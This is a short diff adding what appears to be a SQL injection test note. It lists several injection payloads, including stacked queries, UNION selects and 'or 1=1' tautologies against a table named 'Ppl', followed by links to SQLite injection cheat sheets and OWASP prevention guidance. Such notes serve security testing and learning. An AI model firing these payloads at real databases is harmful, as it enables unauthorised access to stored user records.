@@ -1,0 +1,15 @@
+"name; SELECT * FROM Ppl"
+
+union select * from Ppl where username = 'ABCDEF' or 1 = 1
+test’,(select * from Ppl where username=’root’ or 1=1),’test2’)-- -
+'; select * from Ppl where username = 'ABCDEF' or 1 = 1; --
+
+http://atta.cked.me/home/sqlite3injectioncheatsheet
+https://www.exploit-db.com/docs/33253.pdf
+http://amolnaik4.blogspot.com/2012/02/sql-injection-in-insert-query.html
+http://www.tutorialspoint.com/sqlite/sqlite_injection.htm
+http://gwae.trollab.org/sqlite-injection.html
+https://www.owasp.org/index.php?title=SQL_Injection_Prevention_Cheat_Sheet&setlang=es
+https://pymotw.com/2/sqlite3/
+http://www.veracode.com/security/sql-injection
+
